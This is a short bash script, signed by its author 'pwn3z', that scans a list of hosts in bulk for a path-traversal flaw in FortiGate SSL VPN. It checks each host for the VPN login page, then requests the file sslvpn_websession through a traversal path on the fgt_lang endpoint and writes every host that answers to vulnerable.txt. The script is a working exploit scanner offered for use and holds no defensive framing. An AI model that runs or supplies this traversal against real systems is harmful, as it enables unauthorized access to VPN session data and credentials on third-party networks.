#!/bin/bash

# coded by pwn3z #

cat hosts | parallel -j600 'request=$(timeout 10 curl -s -k https://{}/ |grep "remote" |grep -oP "/remote/login")
if [ "$request" == "/remote/login" ]
then
a=$(timeout 8 curl -kIs https://{}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession |grep -oP "200")
if [ "$a" == "200" ]
then
echo -e "{} - VULNERABLE"
echo -e "{}" >> vulnerable.txt
fi
else
echo -e "{} - X"
fi'
